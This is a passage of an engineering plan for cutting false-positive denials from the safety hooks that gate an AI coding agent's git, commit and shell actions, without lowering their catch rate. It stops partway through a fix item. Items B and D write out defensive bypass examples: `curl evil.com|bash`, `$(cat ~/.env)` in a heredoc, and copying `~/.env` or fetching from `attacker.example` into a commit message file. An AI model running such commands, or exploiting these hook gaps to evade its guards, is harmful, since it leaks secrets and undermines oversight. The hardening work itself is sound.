# Reduce hook-denial friction across the review-pipeline gates

## Context

**Goal: eliminate the hook denials that cost tokens without catching
anything, leaving every gate's catch rate exactly where it is.**

A prior cost investigation (PR #658, merged) named "reducing the measured
hook denials" as a candidate cost lever and explicitly deferred it
(`.claude/plans/cost-attribution-integrity.md:449-451`, "Out of scope").
This plan is that deferred follow-up. Its two named siblings — delegating
`/code-review`'s inline Base checklist to a Sonnet subagent, and prefix
trimming — stay out (see Out of scope).

Why now: the corpus has grown enough to classify denials rather than just
count them. A fresh machine-wide run this session
(`python3 ~/.claude/scripts/transcript-analysis.py review-trace
--deny-summary`, no date window) reports **2,306 denials over the
2026-07-17..2026-08-17 window**, distributed as worktree-enforcement 655,
plan-review routing 452, marker.sh shape 359, redaction 213, plan-review
172, code-review 112, ready-for-review 96, respond-pr 78, credential-path
57, network-install 44, PII-commit 39.

Phase 0's classification pass (below) re-ran the same command 8 days later
and found **2,335 denials over `--since 2026-07-17 --until 2026-08-17`**
(+29, consistent with ordinary corpus growth — the window's end date
tracks "today" in both runs). The per-hook totals used throughout the
disposition table are this second, later run's figures, not the ones
quoted above; the two are reconciled explicitly in that table's footer.

**Provenance of every figure in this plan.** All counts come from that one
command, which scans the union of every root declared in
`~/.claude/transcript-config-dirs` — a corpus mixing this repo's own
sessions with private-engagement ones. Only unattributed aggregate counts
are carried here: no branch name, path, project name, session id, or
per-project breakdown, and nothing that identifies which root contributed
what. `review-trace`'s raw output is not publish-safe under that scope
(`docs/transcript-analysis.md:17`), so it is never quoted — only totals
derived from it. The same constraint governs the PR bodies (see
Verification).

Intended outcome: the denial classes that are provably friction are gone;
the classes that are provably the gates working are documented as such and
left alone; and the repo carries a written record of which is which, so a
future session does not re-litigate it.

A denial is friction only when the session's next move was a reshaped
command carrying the same content, with nothing else changed. Each count
below was classified against that test by recovering the real attempted
command from the raw transcript, not by matching the deny message.

## Approach

Six hooks are denying commands they were never meant to catch, and the
cause is the same in every case: **the hook reasons over the wrong
basis — the raw Bash command string, or the wrong repo's state — instead
of over the thing it actually cares about.** The worktree parser chokes
on shell punctuation that has no git in it; the redaction gate flags the
harness's own `cd` prefix and scratchpad path rather than the diff being
committed; the marker gate hard-rejects a newline regardless of what is
on either side of it; and the worktree-enforcement gate evaluates a
write's legitimacy against the session-anchor repo's markers even when
the write correctly targets a different, valid repo (item H, found during
Phase 0's classification rather than anticipated up front — see that
item). Each fix moves the hook's judgment off the incidental text, or the
wrong repo, and onto the gated content.

Separately, the single largest bucket (plan-review routing, ~457 as of
Phase 0's re-measurement, 452 at plan-authoring time) is not a hook
defect at all: the skill body tells the model to read `ROUTING.md` 136
lines after the step where spawning starts, so a review round that spawns
five specialists pays five denials before the model reads the file once.
That fix is one relocated instruction in a skill body.

Items A–F and H below are **an unordered set, not a sequence.** Their
labels are descriptive names; the execution order is whatever Phase 0's
cost ranking produces, and no item's correctness depends on another's
outcome. Item G is the exception — it re-measures, so it runs after the
others merge. Item H was added during Phase 0's classification pass: it
is a sixth hook defect of the same shape as A–C — the hook reasons over
the wrong basis (the session-anchor repo's markers, not the target
repo's own) rather than the raw command text, but the effect is the same
denial-on-legitimate-input pattern.

Each item lands as **its own PR.** An omnibus diff across six hooks would
be unreviewable, and re-measuring per fix (item G) needs separable
attribution to tell which fix moved which bucket. Later items do not wait
on earlier items' deferred re-measures.

A shared cross-hook command-parsing library was considered and set aside.
It is the over-powered primitive here: every remaining fix is a local
correction inside a parser or regex that already exists, and
`deny-credential-bash-reads.sh` already demonstrates the lighter pattern
(scan → strip a known-benign span → re-scan) that item C reuses. Building
a shared tokenizer would be a larger diff than every fix it replaces and
would put six gates on one new failure surface.

### Denial disposition

Classification is now **complete**. Every one of the ~450 denials the plan
originally left unclassified has been assigned below, via a fresh corpus
investigation this session (`--since 2026-07-17 --until 2026-08-17`,
machine-wide, four parallel passes each sampling individual denial events
against the friction test — never fewer than 5 samples per message
pattern, or the full set when a pattern has fewer than 10 occurrences —
and reconciling its classified counts against that hook's own confirmed
current total before moving on). Reconciliation is stated explicitly per
hook in the paragraph below the table; publishing a fix list without it
would overstate coverage.

| Disposition | Denials | Where |
|---|---|---|
| Friction, fixed by an item below | 1,073 | items A 235, B 322, C 126, E 3, F ~342 of ~457 (unverified this session — see reconciliation), H 45 |
| Genuine catch, no change | 766 | plan-review 176, code-review 112, ready-for-review 98, skill-review 14, `ai-instruction-and-memory-files` 4, Skill/AGENTS.md length caps 9, commit-stall-nudge 1, routing first-in-session ~110 (unverified this session), worktree-enforcement core-four+push/add/clean+`git clean`+live-collision+file-writes-main-tree 159, redaction 81, network-install 1, marker.sh invalid-write-target 1 |
| Deliberate by design, documented, no change | 176 | respond-pr 78 (68 read-gating + 10 write-gating), credential-bash 57, marker.sh 40 (12 quote-aware commit tail + 28 semicolon/pipe-chain), `reviewer-tree-mutation` fail-closed 1 |
| Already closed inside the window | 133 | `stale_lock_race` 104, redaction tracker-ID OSS_ALLOWLIST gaps 7, network-install redirect-glued-token fix (#640) 22 |
| Deferred, needs engineer sign-off | 150 | Item D 39 (revised during plan-review — both the heredoc-scan half and the `-F <path>` timing half now share one sign-off gate; see Item D), dead-PID lock 66, `stash`/`config` ~30 (16 confirmed within `require-worktree-for-git-writes.sh` this session, ~14 inherited estimate for its file-writes counterpart), `git credential` 1, redaction 5 (1 ambiguous tracker-ID + 2 JSON-parse-failure + 2 ambiguous Slack-channel shape), network-install other-shape false positive 8, worktree parser-timeout 1 (N=1, insufficient evidence) |
| Pending — resolved inside Item H's own PR, not asserted here | 36 | worktree-enforcement's "effective working directory cannot be safely determined" — 2/5 sampled genuine catch, 3/5 friction sharing Item H's root cause; the full split is Item H's own verification work per engineer direction, not a Phase-0 deliverable |

**Reconciliation:** 1,073 + 766 + 176 + 133 + 150 + 36 = **2,334 of 2,335**
(off by one). The gap traces entirely to the two buckets this session's
investigation did not re-verify — plan-review routing's internal split
(item F ~342 / genuine-catch ~110 was measured at plan-authoring time
against a 452 total; the fresh total is 457, a +5 drift never re-split)
and the `stash`/`config` deferred estimate (only the 16 within
`require-worktree-for-git-writes.sh` was freshly confirmed; the inherited
~30 total's other ~14, presumably `require-worktree-for-file-writes.sh`'s
share, was never itself re-derived). Both are pre-existing approximations
carried forward from plan-authoring time, not new unclassified denials —
stated here rather than rounded away. Every other hook/gate label
reconciles exactly against its own fresh total: worktree-enforcement 663,
redaction 219, marker.sh 363, PII-commit 39, respond-pr 78, network-install
44 (see each item's section for the per-hook breakdown).

**Plan-review correction, recorded here per the ledger's evidentiary
convention:** Item D's disposition moved from "Friction, fixed" to
"Deferred" during this plan's `/plan-review` pass — `ciso-reviewer` found
the `-F <path>` half's original "no sign-off needed" claim rested on a
false premise about the check's own timing (see Item D).

### Assumption ledger

```
Root: hook denials that change nothing about what the session then does
cost output tokens on the blocked call and its retry, with no
corresponding catch.

Givens:
- The harness mandates a `Co-Authored-By: Claude <noreply@anthropic.com>`
  commit trailer — beyond reach: it is a system-prompt instruction, not a
  repo rule this plan can edit.
- The harness embeds the session UUID in the scratchpad directory path —
  beyond reach: a harness-controlled naming convention.
- `cache_read_input_tokens` is a whole-prefix aggregate with no per-cause
  decomposition — beyond reach: PR #658 established transcripts never
  record the assembled request
  (`.claude/plans/cost-attribution-integrity.md:232-235`).

Row 1 [mechanism]: a committed `--cost` flag on `review-trace` — anchors:
root — denial cost needs re-measuring after every gate change, so the
instrument is durable; a flag on the subcommand that already owns the
event walk, bucket taxonomy, multi-root resolution, and scope header is
the lightest form that survives. The two alternatives both cost more: a
standalone `deny-cost` subcommand duplicates all four
(`.claude/plans/cost-attribution-integrity.md:130-133`), and extending
`friction-count` does not fit its single-transcript, unweighted,
dollar-less shape (`transcript-analysis.py:8706-8729`).
Row 1a [assumption]: the shared walk feeds `cost-ledger --record`'s weekly
`denials` column, and only the subagent-scope half of that coupling can
move the figure — `hook_counts` is dedup-invariant by construction,
because denial detection reads only `attachment`/`user` records while
`dedup_turns_by_request_id` merges consecutive *assistant* records and
passes everything else through; widening `include_subagents` would add
denial events and does move it
[verified: `_review_trace_session_events` at transcript-analysis.py:1444
feeds `_compute_deny_summary_data` at :1670,1696, consumed at :1808 and
:7914 and nowhere else; detection at :1552-1650; unconditional increment
at :1734; `dedup_turns_by_request_id` contract at pricing.py:160-216;
`review-trace`'s scope call passes no `include_subagents`, unlike `cost`
at :4169] — anchors: row1
Row 1b [assumption]: the residual dedup risk is timestamp attribution, not
counts — merging shifts a turn's effective timestamp to its first block's,
which can move `--since`/`--until` boundary inclusion for the command-shape
cross-tab, never for `hook_counts` [verified: same pricing.py contract] —
anchors: row1a
Row 1c [assumption]: `cost-ledger.md` is per-machine and untracked — it
resolves under `config_dir()`, not the repo, so the drift risk is one
operator comparing old rows against freshly recomputed ones, not a shared
artifact other engineers see contradicted
[verified: `_cost_ledger_path` at transcript-analysis.py:7333-7342,
`config_dir()` at _config_dir.py:22-30; the tracked `docs/cost-ledger.md`
is schema documentation only] — anchors: row1a
Row 1d [assumption]: durability is the engineer's call, not a derived
one — hooks are essential harness infrastructure and this measurement will
be run again [engineer-verified] — anchors: row1
Row 2 [mechanism]: per-hook fixes, no shared parser — anchors: root —
each fix is local to a parser or regex that already exists; the heavier
shared-tokenizer option is rejected in Approach above.
Row 3 [assumption]: the `unbalanced group` denials have ONE root cause,
not two — shlex fuses any run of adjacent punctuation characters into a
single composite token, so `);` never equals the literal `")"` the loop
tests and `<(` never equals `"("`
[verified: `shlex.shlex(..., punctuation_chars=True)` reports
`punctuation_chars` as `'();<>|&'`, so `;` is a member and fuses with
adjacent members like any other — `FOO=$(echo hi); echo done` tokenizes as
`['FOO=$', '(', 'echo', 'hi', ');', 'echo', 'done']`; loop tests at
parse-git-command.py:299,302] — anchors: row2
Row 4 [assumption]: because the cause is generic run-fusion, the affected
class is wider than the two observed shapes and includes `;;`, `;&`,
`;;&`, `|&`, `&;`, `);;` [unverified — no corpus instance observed; the
mechanism implies them] — anchors: row3
Row 5 [assumption]: `_lib.sh:589`'s commit tail is
`git[[:space:]]+commit([[:space:]].*)?$` — already unconstrained, so
`require-code-review.sh` accepts the mandated trailer today and the only
gate rejecting it is `enforce-marker-script-shape.sh:333`'s `[^&|;<>]*`
[verified: _lib.sh:582-591, require-code-review.sh:95,
enforce-marker-script-shape.sh:333] — anchors: row2
Row 6 [assumption]: `>` is excluded from that tail deliberately, to block
`git commit ... > /path` as an arbitrary-file-write primitive
[verified: enforce-marker-script-shape.sh:322-332] — anchors: row5
Row 7 [assumption]: `marker.sh write` derives its marker value internally
from repo state and accepts only a skill name, so the shape gate guards
against command smuggling, not marker forgery
[verified: claude/.claude/scripts/marker.sh:186-262] — anchors: row2
Row 8 [assumption]: 124 of 213 redaction denials fire on the command text
(leading `cd <home-rooted path>` prefix, 54; scratchpad session-UUID path,
70) rather than
on any gated content, and this affects exactly one hook —
`deny-private-project-refs.sh:462` scans `$COMMAND` unconditionally, while
`deny-pii-in-commits.sh:310` scans a quote-stripped target and
`deny-network-installs.sh:61,114-156` scans fragments for install verbs,
neither running the structural detectors
[verified: those three call sites; both detectors at `_lib.sh:1307,1310`
have exactly one consumer each, `deny-private-project-refs.sh:626-627`] —
anchors: row2
Row 9 [assumption]: `parse-git-command.py` has exactly one consumer,
`require-worktree-for-git-writes.sh:210`
[verified: repo-wide grep; `deny-repo-relocation.sh:17-20` only names it
in a comment and actually uses `_lib_split_fragments`] — anchors: row2
Row 10 [assumption]: `require-routing-read.sh` fires per `Agent` tool call
with no batch allowance, so N spawns in one round cost N denials
[verified: require-routing-read.sh:33,59-68] — anchors: row2
Row 11 [assumption]: `plan-review/SKILL.md`'s only instruction to read
ROUTING.md is at line 234, after Step 5's spawn step at line 96-98, and
Step 0 never mentions it [verified: plan-review/SKILL.md:13-22,96-98,234]
— anchors: row10
Row 12 [assumption]: `marker.sh deactivate` deletes the routing-read
credit, so every re-review round in a session re-pays
[verified: claude/.claude/scripts/marker.sh:322] — anchors: row10
Row 13 [assumption]: plan-review, code-review, ready-for-review, and
skill-review denials are genuine catches — every sampled denial was
followed by the session actually running the required skill, never a
reshaped retry [verified: 18 sampled events across the four gates] —
anchors: root
Row 14 [assumption]: the 104 `stale_lock_race` denials are already closed
by commit 7804120 (#683) — 104 before that commit, 0 after, through the
end of the measurement window [verified: date-bounded corpus recount] —
anchors: root
Row 15 [assumption]: restricting `_is_git_token` to command position is a
catch-rate regression unless it skips env-assignment and wrapper prefixes,
since `env FOO=bar git commit` and `sudo git commit` are detected today by
the scan-every-token behavior
[verified: parse-git-command.py:174-177 scans all tokens;
deny-repo-relocation.sh:116 carries the reusable skip list] — anchors:
row3
Row 16 [assumption]: friction-reduction is in scope and any change to a
gate's catch rate stops and asks first [engineer-verified] — anchors: root
Row 17 [assumption]: per-denial token cost is measured before targets are
ranked; volume alone is not an accepted proxy [engineer-verified] —
anchors: row1
Row 18 [assumption]: the 223 non-hook friction events are out of scope
[engineer-verified] — anchors: root
Row 19 [assumption]: `require-worktree-for-git-writes.sh`'s
"outside this repository" check evaluates a write's target against the
session-anchor repo's worktree-enforcement markers, not the target path's
own repository state — so a write correctly targeting a different, valid
sibling repo's own linked worktree can never pass
[verified: 5 sampled `outside this repository` denials, fresh corpus
investigation this session — every sample was a session anchored in one
repo issuing a git write against a different repo's own linked worktree;
4 of 5 met the friction test directly (identical reshaped retry denied
again)] — anchors: row2
Row 20 [assumption]: the same hook's pre-execution existence check on a
`git … -C $path` target fires before a same-command-chain `mkdir $path`
has run, so `mkdir X && git -C X init` denies on a path that will exist a
moment later [verified: 2/2 sampled events, fresh corpus investigation
this session] — anchors: row19
Row 21 [assumption]: the hook's main-tree write enforcement does not
distinguish "the active repo's own main tree" from "a scratch directory
with no relationship to any enforced repo," so `git init`/`git clone`
against an unrelated `/tmp` path denies the same way a real main-tree
write does [verified: 4/4 sampled events, fresh corpus investigation this
session] — anchors: row19
Row 22 [assumption]: `git merge-tree` and `git archive` are both
non-mutating (no working-tree, index, or ref changes) by git's own
command semantics, and are absent from the hook's read-only allowlist
[verified: 3/3 sampled events were genuine read-only uses — dry-run
merge-conflict checks, an archive-style export, fresh corpus
investigation this session] — anchors: row2
Row 23 [assumption]: `deny-pii-in-commits.sh`'s `-F <path>` existence
check runs in PreToolUse, before the shell has executed anything, so a
same-command-chain step that creates `$msg_path` earlier (a heredoc write,
`cat > file`) is invisible to the check at evaluation time
[verified: 5/5 sampled denials, fresh corpus investigation this
session — every sample's reshaped retry carried an identical `-m` message
and succeeded] — anchors: row2
Row 24 [assumption]: `enforce-marker-script-shape.sh` denies
`;`/`||`-chained `marker.sh` invocations and `&&`-chains to a non-`git
commit` command on purpose, per its own deny-message text, not as a
parsing artifact of the newline/tail/traversal fixes in item B
[verified: hook's own deny message states the `;`/`||` exclusion and the
`&& git commit`-only chain restriction explicitly; 28 sampled denials
matched one of the three named shapes, fresh corpus investigation this
session] — anchors: row2
Row 25 [assumption]: `deny-network-installs.sh`'s corpus total is not a
usable proxy for item E's size — most of it is a different, already-fixed
bug (redirect-glued-token false positive on a genuine install command,
closed by commit 730ecd8/#640, zero occurrences after that commit) and a
documented deliberate tradeoff, not item E's echo/printf pattern
[verified: all 44 `network-install` denials in the corpus window replayed
against current `deny-network-installs.sh` and correlated to their
recovered command; commit 730ecd8 dated 2026-08-12, 22/22 matching
denials predate it, fresh corpus investigation this session] — anchors:
root
Row 26 [assumption]: 7 of the corpus's 11 tracker-ID redaction denials
predate their own `OSS_ALLOWLIST` fix commit by hours to a day, the same
already-closed-inside-the-window pattern as `stale_lock_race`
[verified: `git log -S` on `deny-private-project-refs.sh` matched each of
the 7 denials' timestamps against its corresponding allowlist-addition
commit, fresh corpus investigation this session] — anchors: row2
```

## Work items

### Phase 0 — Classification, baseline, and cost ranking

Two deliverables, both prerequisites for every item below.

**Complete the disposition table — done.** Every one of the ~450
originally-unclassified denials is now assigned in the Denial disposition
table above, including one new item (H) the classification pass itself
surfaced. This is what makes the plan's coverage claim checkable.

**Rank by cost — as a durable instrument, not a throwaway.** Hooks are
load-bearing in this harness and their denial profile will need
re-measuring after each item lands and on every future change to a gate,
so this ships as a committed `--cost` flag on `review-trace` rather than a
scratchpad script. It prices each denial as the blocked call's
assistant-turn `output_tokens` plus the next assistant turn's
`output_tokens`, grouped by `_denial_hook_label`, reusing `_price_turn`
and `dedup_turns_by_request_id`
(`transcript_analysis/pricing.py:314-356,160-216`) and `hook_denial_key`
(`transcript-analysis.py:1073-1101`).

A flag on `review-trace` is the lightest durable option: it already owns
the event walk, the denial-bucket taxonomy, multi-root resolution, and the
scope header. A standalone `deny-cost` subcommand would duplicate all four
— the reasoning PR #658 used to reject the same shape
(`.claude/plans/cost-attribution-integrity.md:130-133`). Extending
`friction-count` does not fit: it is a single-transcript, hook-driven,
unweighted composite with no corpus aggregation and no dollar dimension
(`transcript-analysis.py:8706-8729`).

**The flag must not change what the shared walk emits.**
`_review_trace_session_events` (`:1444`) feeds `_compute_deny_summary_data`
(`:1670`), consumed at `:1808` and by `cost-ledger --record`'s weekly
`denials` column (`:7914`) — and nowhere else. That ledger is per-machine
and untracked (`_cost_ledger_path`, `:7333-7342`), so the exposure is one
operator's own history going internally inconsistent, not a shared
artifact. Two consequences:

- `dedup_turns_by_request_id` is applied **inside the cost accumulation
  only**, never to the shared walk. It is required there because
  `output_tokens` reaches its billed value only on a multi-block
  response's last record. It is kept out of the walk not to protect the
  denial count — that is dedup-invariant by construction, since detection
  reads `attachment`/`user` records and dedup merges only consecutive
  assistant ones — but because merging shifts a turn's effective timestamp
  to its first block's, which can move `--since`/`--until` boundary
  inclusion for the command-shape cross-tab.
- The walk runs without `include_subagents`, unlike `cost` (`:4169`), so
  sidechain denials are invisible. `--cost` reports main-thread denials
  only. What share of denials that omits is **unknown, not negligible** —
  dispatched reviewers and `code-writer` run Bash, Edit, and Write against
  the same hooks — so the output states it as an unmeasured gap rather
  than a minor caveat. Widening the scope moves `--deny-summary` and the
  ledger column with it, so it is a separate decision.

Carried context occupancy is reported as a separately-labelled estimate
priced from the denial text's own size, never folded into the attributed
figure — per the ledger's third given.

Phase 0 was already a prerequisite for the others' start order, so this
adds no new dependency — but it does lengthen the critical path, since the
prerequisite now carries a full review-and-merge cycle instead of a
scratchpad run. That is the cost of the instrument being durable.

Because this adds committed surface, Phase 0 is its own PR: the flag, its
tests in `claude/.claude/scripts/tests/test_transcript_analysis.py`, its
entry in `docs/transcript-analysis.md`'s per-subcommand section (`:385`),
and `docs/transcript-analysis-architecture.md`, which carries its own
conformance test (`test_transcript_analysis_architecture_doc.py`). The
publish-safety caveat is inherited, not waived: `review-trace` output is
not publish-safe under the default machine-wide scope
(`docs/transcript-analysis.md:17`), and a per-bucket dollar view does not
change that.

**Stop rule.** Compute the denominator with
`python3 ~/.claude/scripts/transcript-analysis.py cost --since 31d`. Note
that `cost` and `review-trace` do not share a window grammar: `cost` takes
a relative `Nd` and has **no `--until`**, while `review-trace --since`
takes an absolute `YYYY-MM-DD` and does right-bound. So the denominator is
left-bounded only, and the numerator must be recomputed over the same
left-bounded, unbounded-right window rather than the corpus window quoted
in Context — otherwise the ratio compares two different spans. If
denial-attributable cost is under 1% of that figure, stop and report
instead of shipping fixes. A single-session proof of concept established
only the *shape* of the cost — the blocked call's and the retry turn's
output tokens dominate, and the carried-context share is both small and
structurally unattributable. It produced no figure this plan carries;
Phase 0 derives the magnitude from the corpus.

### Item A — `parse-git-command.py` composite-token fusion (235)

One root cause, not two. `shlex` with `punctuation_chars=True` fuses any
run of adjacent punctuation characters into a single token, so `);`
tokenizes whole and matches neither the literal `")"` at
`parse-git-command.py:302` nor `";"`, leaving `paren_depth` never
decremented; `<(` likewise never equals the `"("` at `:299`, so no group
opens while its later standalone `)` drives the depth negative. The fix is
to post-tokenize and split fused punctuation runs into their constituent
operators, longest-match-first so `&&` and `||` survive as single
operators.

Because the cause is generic, the fix must cover the class, not the two
observed shapes: `;;`, `;&`, `;;&`, `|&`, `&;`, `);;`. Special-casing `);`
and `<(` would pass every named test and leave the siblings broken.

Separately, `_is_git_token` (`parse-git-command.py:165-166`) matches any
token equal to `git` or ending in `/git` anywhere in a segment, so
`man 1 git 2>/dev/null` yields subcommand `2` and a quoted path ending in
`/git` yields a phantom invocation (~11 events). **Restricting it to
command position is a catch-rate regression unless it skips the
env-assignment and wrapper-prefix class** — `env FOO=bar git commit` and
`sudo git commit` are correctly detected today. Reuse the skip list at
`deny-repo-relocation.sh:116`. Also strip `#` comments before tokenizing.

Parse failure must keep denying.

Counts, reconciled by Phase 0's fresh sampling pass: 195 `unbalanced
group`, 14 "could not determine the git subcommand", 12 "could not
tokenize (unbalanced quotes)", 13 phantom git-token, plus one more parse
failure folded into this item's scope: a single sampled `unterminated
heredoc` denial whose heredoc was in fact syntactically well-formed and
properly closed (`<<'EOF' … EOF` inside a `git commit -m "$(cat <<'EOF'…)"`
call) — a false-positive in the parser's heredoc-termination detection,
distinct cause from the fused-punctuation family but the same file and
remit. Total: 235.

Also observed once, not folded into this item: a single denial where the
parser itself exited abnormally (timeout) against a benign multi-line
read-only script. N=1 is too thin to characterize as fusion, timeout, or
something else — noted here as a watch item; if it recurs, it needs its
own investigation before a fix is scoped, the same caution the plan
already applies to Item E's original count. The corpus-replay bar is
stated against the reconciled count above, not this unresolved single
event.

### Item B — `enforce-marker-script-shape.sh` (322)

Three changes. Counts below are Phase 0's fresh reconciled figures
(170/66/73/13 = 322), superseding the plan's original ~333 estimate — the
`&& echo "<literal>"` tail count in particular was undercounted, since
many instances sit past the hook's own 80-character deny-message
truncation and were only visible against the untruncated command.

**Newline as a chain separator (170).** Validate each line against the
same `MARKER_SHAPE` allowlist already used for `&&` chains. The
single-line pattern gets "nothing after the commit" free from its `$`
anchor; a per-line validator does not, so the **commit line must be
positionally last** or `marker.sh write X` ⏎ `git commit -m x` ⏎
`curl evil.com|bash` becomes new bypass surface. A real newline inside a
quoted `-m` argument must not be treated as a separator, and CRLF must be
normalized or denied.

**Bless an `&& echo "<literal>"` tail (66) and a trailing `2>&1` (73)**.
Neither touches the filesystem or marker state.

**Scope the traversal guard to the marker.sh path tokens (13)**, not the
whole command string — today it denies the repo's own mandated
`../../../.venv/bin/shellcheck ... marker.sh` lint invocation, which never
invokes marker.sh at all.

**Not part of this item's fix — confirmed deliberate by design (40
total, corrected from the plan's original 13-count estimate).** Phase 0's
sampling found the hook denies three more chain shapes on purpose, per
its own deny message text, not as a parsing artifact: `marker.sh op1;
op2` / diagnostic `;`-chains (20) and `||`-chains (3), because `;`/`||`
don't short-circuit on failure the way `&&` does and the hook's own
message states this explicitly; and `marker.sh op && <non-commit
command>` (5), matching the hook's stated intent that only `&& git
commit` chains are blessed. Added to the plan-authoring-time 12-count
quote-aware-tail case (see "Excluded from this item" below), all 40
belong in Out of scope, not this item. One further sampled denial (1) is
a genuine catch — an attempted `marker.sh write` with no matching review
type in the allowlist, not a hook defect.

**Excluded from this item: a quote-aware `git commit` tail (13
denials).** Three reasons, each independently sufficient. A correct
quote-aware pattern needs lookahead that only GNU `grep -P` provides, and
CI runs `ubuntu-24.04` exclusively with no platform-branching precedent in
the repo, so a GNU-dependent pattern would pass CI while behaving
differently under every macOS contributor's BSD grep. A hand-rolled ERE
approximation of bash quote grammar fails open silently when it is wrong,
and bash quote semantics differ by quote type in ways ERE cannot express
(`\'` does not escape inside single quotes; `$'...'` processes a different
backslash set). And 13 events do not justify it when two zero-code paths
already work: `git commit -F <file>`, and the standalone `marker.sh write`
form that `code-review/SKILL.md:394` already lists first. Instead, add
this sentence immediately after that existing line 394 listing (drafted
here per `skill-review`'s request for literal text to check voice and
wording against, matching how Item F's drafts are given):

> The chained `marker.sh write X && git commit ...` form rejects `<` and
> `>` in the commit message — the mandated `Co-Authored-By` trailer
> contains both — so use the standalone form above instead.

`skill-review` confirmed this is factually grounded
(`enforce-marker-script-shape.sh:333`'s tail class is `[^&|;<>]*`, the
mandated trailer contains both characters) and not a duplicate of
anything already stated elsewhere in this repo's skill bodies.

Two comments become false and must be corrected in the same diff:
`enforce-marker-script-shape.sh:329-332` claims "no observed agent
friction on the commit-chain form to justify it" — the corpus falsifies
that; and `_lib.sh:583-585` claims its pattern "mirrors
enforce-marker-script-shape.sh's `VALID_CHAINED_COMMIT_PATTERN`" when its
tail is `([[:space:]].*)?$` against the other's `[^&|;<>]*`. Neither is a
preserved record; both describe current behavior.

### Item C — redaction self-triggers, `deny-private-project-refs.sh` only (126)

**Strip a leading `cd <path>` / `git -C <path>` navigational token before
the structural scan — for the home-rooted-path detector only (54).** The
long-hex and internal-hostname detectors keep scanning that span: a UUID
or an internal hostname sitting in a `cd` target is a real leak, and
"the operator already knows their own path" is not an argument once the
same command text can reappear in a committed artifact. The staged diff,
message file, and PR body stay fully scanned in every case.

**Exempt the session UUID in the harness scratchpad path from the long-hex
detector (71, corrected from the plan's original 70-count estimate by
Phase 0's fresh sampling) — by exact-value match against the live session
ID, never by path shape.** A shape match would exempt any long hex string
wrapped in a lookalike path, including one an injection controlled.

**Also fold in a narrower sibling of the same self-trigger shape (1),
found by Phase 0's sampling: the home-rooted-path detector firing on an
absolute-path *script invocation* — the command's own executable is a
harness-scaffolding path, not a `cd`/`-C` target.** Item C's stripped-token
logic only recognizes a leading `cd`/`-C` prefix, so this shape survives
the fix above unless the implementer widens the strip to cover an
absolute-path command token in addition to a navigational prefix. Low
volume, but it shares Item C's exact root cause and file, so it belongs in
this PR rather than a new item.

**Revised during plan-review: this widened strip carries the same
precision requirement bullet 2 already states, made explicit here because
bullet 3 originally omitted it.** `claude-hook-review` and `ciso-reviewer`
independently flagged the same gap: bullet 1 scopes its strip to the
home-rooted-path detector only, and bullet 2 requires exact-value match
(not shape match) specifically to block an injection-controlled lookalike
— but the drafted "widen the strip to cover an absolute-path command
token" gave no equivalent constraint, so an implementer could plausibly
strip *any* leading absolute-path executable token, including one that
IS the gated content (e.g. `bash /Users/<user>/some-other-repo/deploy.sh
&& git commit ...`, where the private path is real, not scaffolding). Fix:
the widened strip matches by exact value/allowlist against known harness
scaffolding script paths — never by shape — mirroring bullet 2's own
constraint and its rationale.

**Not resolved here — two ambiguous Slack-channel-shape denials (of 27
sampled), left denied.** Both sampled events have the matched span
sitting inside the command text itself, in a shape resembling a
markdown-style `#`/`(#...)` fragment rather than clearly gated content.
Unlike the `cd`/`-C` self-trigger cases, the transcript evidence did not
settle whether this is scaffolding or real content — recorded in the
disposition table as deferred, not asserted as friction, and not part of
this item's fix.

This item touches one hook. `deny-pii-in-commits.sh` and
`deny-network-installs.sh` do not run these detectors (ledger row 8) and
are separate items.

### Item D — `deny-pii-in-commits.sh` heredoc scanning and `-F <path>` timing (39)

Today `git commit -F -` is blanket-denied because the gate cannot verify
what git reads from a pseudo-file. Scan the body instead — but **only for
the exact fully-quoted `<<'DELIM'` form.** An unquoted `<<DELIM` lets bash
expand `$(cat ~/.env)` before git ever reads it, so the scanner would see
source text and never the secret that becomes the commit message. Every
other form denies, with an explicit test each: unquoted delimiter,
partially-quoted (`<<"D"ELIM`, `<<D\ELIM`), `<<-` tab-stripping, chained
heredocs (`cmd <<A <<B`), delimiter appearing mid-body, and a heredoc
redirect placed before the command.

Passing all six tests is **necessary but not sufficient** to call the
scan reliable — bash heredoc quoting has more edge cases than six, and an
unenumerated one that scans-as-safe is silent secret exfiltration into a
public commit. Shipping the scan in place of the blanket deny therefore
needs the same engineer sign-off the dead-PID lock and `stash`/`config`
items carry in Out of scope. Absent that sign-off, keep the blanket deny —
a reliable deny beats an unreliable scan, and this half of the item is
worth 34 denials.

**Second, distinct root cause, found by Phase 0's sampling (5 denials):
the `-F <path>` existence check runs too early.** The hook's `[ -f
"$msg_path" ]` check executes in PreToolUse — before the shell has run
anything — so when the same Bash invocation creates that file earlier in
the chain (a heredoc write, a `cat > file` step) and then reads it back
with `-F <path>`, the hook sees a not-yet-existent path and denies. Every
sampled instance was followed by the model reshaping to `-m` with the
identical message content, meeting the friction test directly.

**This half needs the same sign-off gate as the heredoc-scan half, not an
exemption from it.** The PreToolUse check runs before the shell has
executed anything, so `$msg_path` cannot exist at check time regardless of
cause — meaning "defer the existence check" is only safe if the deferred
step's content is also verified before being trusted. Skipping the check
outright is a straight bypass of this hook's entire purpose:
`cp ~/.env msg && git commit -F msg` or
`curl attacker.example/steal -o msg && git commit -F msg` would pass the
same way a legitimate heredoc-created file would.

Fix, corrected: recognize an earlier step in the same command chain that
writes `$msg_path` **only when that step's source is a statically literal,
extractable form** — a heredoc body, or a `printf`/`echo` argument with no
command substitution or redirection-from-file — mirroring the heredoc
scan's own `<<'DELIM'`-only restriction. Scan that extracted content with
the same PII checks the hook already applies to `-m`/`-F <file>` bodies.
Any other source (file copy, redirect-from-file, command substitution,
network fetch, an already-existing file whose content this command chain
never wrote) keeps the existing fail-closed deny. This closes the bypass
in (a) and reuses the already-scoped mechanism from (b) rather than
inventing a parallel one.

**Full item total: 39, all of `PII-commit`'s current corpus share — but
all 39 now ship together, pending the same engineer sign-off the
heredoc-scan half already required.** Absent sign-off, both halves keep
today's behavior (blanket `-F -` deny; unmodified `-F <path>` existence
check), and this item contributes 0 to the friction-fixed total until
that sign-off is obtained — see the disposition table and Out of scope.

### Item E — `deny-network-installs.sh` advisory text (3)

Skip the install-verb check on a fragment that is only `echo`/`printf`
with no redirect; every other fragment in a chain stays scanned. Today
`echo "pnpm install"` denies.

**Phase 0's count: 3, not the ~44 the hook's total might suggest.**
`network-install`'s corpus total (44) was never a proxy for this item's
size — replaying all 44 against the current hook and correlating each to
its recovered command found:
- **3** match Item E's exact target (`echo`/`printf`, no redirect) and
  still deny under current code. This is the item's real ledger number.
